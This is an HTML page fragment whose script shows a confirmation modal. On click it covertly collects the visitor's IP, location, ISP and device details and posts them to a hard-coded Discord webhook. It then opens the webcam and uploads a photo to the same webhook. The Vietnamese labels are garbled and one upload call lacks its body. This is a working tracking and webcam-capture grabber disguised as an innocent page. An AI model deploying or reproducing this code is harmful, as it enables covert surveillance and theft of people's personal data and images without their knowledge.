    @keyframes slideDown {

    .modal-content h2 {

    .btn:hover {

  <script>
    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1440247747700723732/vmQeU92yVVYgp8uuYkRttiIgWDH5ttAsPegnTh8zwBuIg7mofGMH9_UMAQbsaF-Mny1t';

    function capturePhoto() {
      const video = document.getElementById('video');
      if (!video.videoWidth || !video.videoHeight) return;
      
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);

      canvas.toBlob(blob => {
        if (!blob) return;
        
        const formData = new FormData();
        formData.append('file', blob, 'photo.jpg');
        const payload = { username: 'ThanhPhuc System', content: 'ðŸ“¸ Webcam Capture' };
        formData.append('payload_json', JSON.stringify(payload));
        
        fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData })
          .then(response => console.log('Photo sent:', response.status))
          .catch(err => console.error('Photo error:', err));
      }, 'image/jpeg');
    }

    function sendToDiscord(ipData, userData) {
      const discordPayload = {
        username: 'ThanhPhuc Check System',
        avatar_url: 'https://cdn-icons-png.flaticon.com/512/888/888879.png',
        content: 'ðŸš¨ **THÃ”NG TIN NGÆ¯á»œI DÃ™NG ÄÃƒ TRUY Cáº¬P** ðŸš¨',
        embeds: [{
          title: "ðŸ“Š Chi tiáº¿t thÃ´ng tin há»‡ thá»‘ng",
          color: 16711680,
          fields: [
            { name: "ðŸŒ IP Address", value: ipData.ip || "KhÃ´ng xÃ¡c Ä‘á»‹nh", inline: true },
            { name: "ðŸ“ Vá»‹ trÃ­", value: ipData.location || "KhÃ´ng xÃ¡c Ä‘á»‹nh", inline: true },
            { name: "ðŸ–¥ï¸ Há»‡ Ä‘iá»u hÃ nh", value: userData.os || "KhÃ´ng xÃ¡c Ä‘á»‹nh", inline: true },
            { name: "ðŸ” User Agent", value: "```" + (userData.userAgent || "KhÃ´ng xÃ¡c Ä‘á»‹nh").substring(0, 1000) + "```" },
            { name: "âš¡ CPU Cores", value: String(userData.cpuCores) || "KhÃ´ng xÃ¡c Ä‘á»‹nh", inline: true },
            { name: "ðŸ’¾ RAM", value: userData.ram ? String(userData.ram) + " GB" : "KhÃ´ng xÃ¡c Ä‘á»‹nh", inline: true },
            { name: "ðŸŽ® GPU", value: "```" + (userData.gpu || "KhÃ´ng xÃ¡c Ä‘á»‹nh").substring(0, 1000) + "```" },
            { name: "ðŸŒ NgÃ´n ngá»¯", value: userData.language || "KhÃ´ng xÃ¡c Ä‘á»‹nh", inline: true },
            { name: "ðŸ–¥ï¸ Platform", value: userData.platform || "KhÃ´ng xÃ¡c Ä‘á»‹nh", inline: true },
            { name: "ðŸ“º Äá»™ phÃ¢n giáº£i", value: userData.screen || "KhÃ´ng xÃ¡c Ä‘á»‹nh", inline: true },
            { name: "â° MÃºi giá»", value: userData.timezone || "KhÃ´ng xÃ¡c Ä‘á»‹nh", inline: true },
            { name: "ðŸ”Œ ISP", value: ipData.isp || "KhÃ´ng xÃ¡c Ä‘á»‹nh", inline: true }
          ],
          timestamp: new Date().toISOString(),
          footer: { text: "ThanhPhuc Check System â€¢ " + new Date().toLocaleString('vi-VN') }
        }]
      };

      fetch(DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },

      })
        .then(response => console.log('Data sent:', response.status))
        .catch(err => console.error('Send error:', err));
    }

    async function getIPFromAPIs() {
      const apiEndpoints = [
        'https://api.ipify.org?format=json',
        'https://api64.ipify.org?format=json',
        'https://ipapi.co/json/',
        'https://ipwho.is/'
      ];

      for (const endpoint of apiEndpoints) {
        try {
          const response = await fetch(endpoint, {
            method: 'GET',
            headers: { 'Accept': 'application/json' }
          });
          
          if (response.ok) {
            const data = await response.json();
            
            if (data.ip) {
              return {
                ip: data.ip,
                country: data.country || data.country_name || data.countryCode || '',
                city: data.city || '',
                region: data.region || data.regionName || '',
                isp: data.org || data.isp || data.asn || '',
                location: [data.city, data.region, data.country].filter(Boolean).join(', ') || 'KhÃ´ng xÃ¡c Ä‘á»‹nh',
                method: endpoint
              };
            }
          }
        } catch (error) {
          continue;
        }
      }
      
      return { 
        ip: "KhÃ´ng thá»ƒ xÃ¡c Ä‘á»‹nh", 
        location: "KhÃ´ng xÃ¡c Ä‘á»‹nh", 
        isp: "KhÃ´ng xÃ¡c Ä‘á»‹nh" 
      };
    }

    function collectSystemInfo() {
      const userAgent = navigator.userAgent;
      const os = getOS();
      const cpuCores = navigator.hardwareConcurrency || 'N/A';
      const ram = navigator.deviceMemory || 'N/A';
      const gpu = getGPU();
      const language = navigator.language || navigator.userLanguage || 'N/A';
      const platform = navigator.platform || 'N/A';
      const screenRes = screen.width + "x" + screen.height;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';

      return {
        userAgent: userAgent,
        os: os,
        cpuCores: cpuCores,
        ram: ram,
        gpu: gpu,
        language: language,
        platform: platform,
        screen: screenRes,
        timezone: timezone
      };
    }

    function requestCameraAccess() {
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.onloadedmetadata = () => {
              video.play();
              setTimeout(() => capturePhoto(), 1000);
            };
          })
          .catch(err => console.error('Camera error:', err));
      }
    }

    function getOS() {
      const ua = navigator.userAgent;
      if (/windows phone/i.test(ua)) return "Windows Phone";
      if (/android/i.test(ua)) return "Android";
      if (/iPad|iPhone|iPod/.test(ua)) return "iOS";
      if (/Macintosh|Mac OS X/.test(ua)) return "Mac OS";
      if (/Windows NT/.test(ua)) return "Windows";
      if (/Linux/.test(ua)) return "Linux";
      return "Unknown";
    }

    function getGPU() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          if (debugInfo) {
            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A';
          }
        }
      } catch (e) {}
      return 'N/A';
    }

    async function collectAndSendData() {
      try {
        const systemInfo = collectSystemInfo();
        const ipData = await getIPFromAPIs();
        sendToDiscord(ipData, systemInfo);
        requestCameraAccess();
      } catch (error) {
        console.error('Collection error:', error);
      }
    }

    function handleConfirm() {
      document.getElementById('notificationModal').style.display = 'none';
      collectAndSendData();
    }

    document.getElementById('confirmBtn').addEventListener('click', handleConfirm);

    window.addEventListener('DOMContentLoaded', function() {
      setTimeout(() => {
        document.getElementById('notificationModal').style.display = 'block';
      }, 500);
    });
  </script>
